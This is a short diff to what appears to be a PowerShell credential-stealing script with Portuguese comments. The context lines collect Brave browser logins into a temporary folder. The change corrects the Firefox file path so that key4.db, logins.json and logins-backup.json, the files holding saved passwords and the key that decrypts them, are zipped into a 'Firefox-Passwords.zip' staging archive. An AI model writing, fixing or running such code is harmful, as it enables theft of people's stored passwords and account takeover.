@@ -536,7 +536,7 @@ Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\Brow
 Move-Item -Path "$env:TMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 
 # Puxa as palavra passes encriptadas do firefox
-Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\login.json", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins-backup.json" -DestinationPath "$env:TEMP\$FolderName\Dados-do-Browser\Firefox-Passwords.zip"
+Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins-backup.json" -DestinationPath "$env:TEMP\$FolderName\Dados-do-Browser\Firefox-Passwords.zip"
 
 
 ############################################################################################################################################################
